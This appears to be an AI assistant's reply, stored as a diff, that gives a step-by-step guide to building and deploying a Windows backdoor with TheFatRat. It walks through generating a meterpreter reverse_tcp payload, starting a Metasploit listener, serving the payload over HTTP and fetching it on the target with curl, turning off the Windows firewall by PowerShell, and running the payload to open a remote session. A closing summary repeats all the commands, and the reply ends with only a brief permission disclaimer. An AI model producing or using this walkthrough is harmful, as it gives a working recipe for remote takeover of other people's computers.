@@ -1,0 +1,253 @@
+Sure, let's go through the steps again and add an additional step after executing the payload.
+
+### Step-by-Step Guide to Creating and Deploying a Payload with TheFatRat on Ubuntu
+
+#### 1. **Install TheFatRat**
+
+First, install TheFatRat on your Ubuntu machine:
+
+  
+sudo apt update
+sudo apt install git -y
+git clone https://github.com/Screetsec/TheFatRat.git
+cd TheFatRat
+chmod +x setup.sh && sudo ./setup.sh
+
+Follow the on-screen instructions to complete the installation.
+
+#### 2. **Generate a Payload**
+
+Run TheFatRat using the command:
+
+  
+sudo ./fatrat
+
+You'll be presented with the following menu:
+
+ plaintext
+        [01]  Create Backdoor with msfvenom
+        [02]  Create Fud 100% Backdoor with Fudwin 1.0
+        [03]  Create Fud Backdoor with Avoid v1.2
+        [04]  Create Fud Backdoor with backdoor-factory [embed]
+        [05]  Backdooring Original apk [Instagram, Line,etc]
+        [06]  Create Fud Backdoor 1000% with PwnWinds [Excelent]
+        [07]  Create Backdoor For Office with Microsploit
+        [08]  Trojan Debian Package For Remote Acces [Trodebi]
+        [09]  Load/Create auto listeners
+        [10]  Jump to msfconsole
+        [11]  Searchsploit
+        [12]  File Pumper [Increase Your Files Size]
+        [13]  Configure Default Lhost & Lport
+        [14]  Cleanup
+        [15]  Help
+        [16]  Credits
+        [17]  Exit
+
+ ┌─[TheFatRat]──[~]─[menu]:
+ └─────►
+
+Choose option `[01] Create Backdoor with msfvenom` by typing `01` and pressing `Enter`.
+
+Next, you will see:
+
+ plaintext
+  =====================================================================
+ |    Create Payload with msfvenom ( must install msfvenom )           |
+  =====================================================================
+  ___________
+ |           |======[***       ____                _
+ |  MSFVENOM  \              / ___|_ __ ___  ____| |_ ___  _ __
+ |_____________\_______      | |   | '__/ _ \/ _  | __/ _ \| '__|
+ |==[v1.3 >]===========\     | |___| | |  __/ (_| | || (_) | |
+ |______________________\     \____|_|  \___|\____|\__\___/|_|
+  \(@)(@)(@)(@)(@)(@)(@)/
+  *********************
+
+  =====================================================================
+ |                             Created by  Edo Maland  ( Screetsec )   |
+  =====================================================================
+
+        [1]  LINUX >> FatRat.elf
+        [2]  WINDOWS >> FatRat.exe
+        [3]  SIGNED ANDROID >> FatRat.apk
+        [4]  MAC >> FatRat.macho
+        [5]  PHP >> FatRat.php
+        [6]  ASP >> FatRat.asp
+        [7]  JSP >> FatRat.jsp
+        [8]  WAR >> FatRat.war
+        [9]  Python >> FatRat.py
+        [10] Bash >> FatRat.sh
+        [11] Perl >> FatRat.pl
+        [12] doc >> Microsoft.doc ( not macro attack )
+        [13] rar >> bacdoor.rar ( Winrar old version)
+        [14] dll >> FatRat.dll
+        [15] Back to Menu
+
+ ┌─[TheFatRat]──[~]─[creator]:
+ └─────► 2
+
+Choose option `[2] WINDOWS >> FatRat.exe` by typing `2` and pressing `Enter`.
+
+Next, you will be prompted to set the `LHOST` IP address:
+
+ plaintext
+   Your local IPV4 address is : 172.24.52.110
+   Your local IPV6 address is : fe80::215:5dff:fe3d:2fe9
+   Your public IP address is : 87.70.24.227
+   Your Hostname is : 3(NXDOMAIN
+
+   Set LHOST IP: 172.24.52.110
+
+**Enter the local IPv4 address: `172.24.52.110`**
+
+ plaintext
+Set LHOST IP: 172.24.52.110
+
+Then, you will be prompted to set the `LPORT`:
+
+ plaintext
+Set LPORT: 4444
+
+**Enter the port number: `4444`**
+
+ plaintext
+Set LPORT: 4444
+
+Next, you will be asked to enter the base name for output files:
+
+ plaintext
+Please enter the base name for output files : payload
+
+**Enter a base name for the output files: `payload`**
+
+ plaintext
+Please enter the base name for output files : payload
+
+Next, you will see the payload options:
+
+ plaintext
+   +-------------------------------------------+
+   | [ 1 ] windows/shell_bind_tcp              |
+   | [ 2 ] windows/shell/reverse_tcp           |
+   | [ 3 ] windows/meterpreter/reverse_tcp     |
+   | [ 4 ] windows/meterpreter/reverse_tcp_dns |
+   | [ 5 ] windows/meterpreter/reverse_http    |
+   | [ 6 ] windows/meterpreter/reverse_https   |
+   +-------------------------------------------+
+
+   Choose Payload :
+
+**Choose option `[3] windows/meterpreter/reverse_tcp` by typing `3` and pressing `Enter`.**
+
+TheFatRat will then generate the payload named `payload.exe` and save it to the specified path: `/root/TheFatRat/2`.
+
+#### 3. **Set Up a Listener**
+
+Set up a listener on your machine to catch the reverse shell using Metasploit. Open a new terminal window and execute the following commands:
+
+  
+sudo msfconsole
+
+Once in the Metasploit console, configure the listener:
+
+  
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 172.24.52.110
+set LPORT 4444
+exploit
+
+#### 4. **Deliver the Payload**
+
+Host the payload on a web server so the target can download it. Use Python's built-in HTTP server:
+
+1. Start a web server in the directory containing `payload.exe`:
+
+      
+    cd /root/TheFatRat/2
+    python3 -m http.server 8080
+
+2. On the target machine, use `curl` to download the payload:
+
+      
+    curl -o C:\Windows\Temp\payload.exe http://172.24.52.110:8080/payload.exe
+
+#### 5. **Disable Windows Firewall**
+
+Before executing the payload, disable the Windows firewall using a comprehensive PowerShell command. Open Command Prompt or PowerShell as an administrator on the target machine and execute the following command:
+
+  
+powershell -Command "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"
+
+#### 6. **Execute the Payload on the Target**
+
+Once the payload is downloaded on the target machine, execute it to establish the reverse shell:
+
+1. Open Command Prompt or PowerShell as an administrator on the target machine.
+2. Execute the payload:
+
+      
+    C:\Windows\Temp\payload.exe
+
+#### 7. **Verify the Connection**
+
+After executing the payload, switch back to your Metasploit console to verify that the connection has been established. You should see a meterpreter session opened.
+
+### Example Summary
+
+Here is a summary of the commands and actions:
+
+1. **Install TheFatRat**:
+     
+   sudo apt update
+   sudo apt install git -y
+   git clone https://github.com/Screetsec/TheFatRat.git
+   cd TheFatRat
+   chmod +x setup.sh && sudo ./setup.sh
+
+2. **Generate Payload**:
+     
+   sudo ./fatrat
+   # Follow menu prompts:
+   # Choose 01: Create Backdoor with msfvenom
+   # Choose 2: WINDOWS >> FatRat.exe
+   # Set LHOST IP: 172.24.52.110
+   # Set LPORT: 4444
+   # Enter base name for output files: payload
+   # Choose 3: windows/meterpreter/reverse_tcp
+
+3. **Set Up Listener**:
+     
+   sudo msfconsole
+   use exploit/multi/handler
+   set payload windows/meterpreter/reverse_tcp
+   set LHOST 172.24.52.110
+   set LPORT 4444
+   exploit
+
+4. **Deliver Payload**:
+   - On attacker's machine:
+       
+     cd /root/TheFatRat/2
+     python3 -m http.server 8080
+
+   - On target's machine:
+       
+     curl -o C:\Windows\Temp\payload.exe http://172.24.52.110:8080/payload.exe
+
+5. **Disable Windows Firewall**:
+   - On target's machine, open Command Prompt or PowerShell as administrator and execute:
+       
+     powershell -Command "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled
+
+ False"
+
+6. **Execute Payload**:
+   - On target's machine, open Command Prompt or PowerShell as administrator and execute:
+       
+     C:\Windows\Temp\payload.exe
+
+7. **Verify the Connection**:
+   - Check your Metasploit console to ensure the meterpreter session has been established.
+
+By following these steps with the specified IP address (`172.24.52.110`) and the given path (`/root/TheFatRat/2`), you should be able to create, deliver, and deploy a payload using TheFatRat on Ubuntu, including disabling the Windows firewall and verifying the connection. Remember to use these tools responsibly and only on systems you have permission to test.
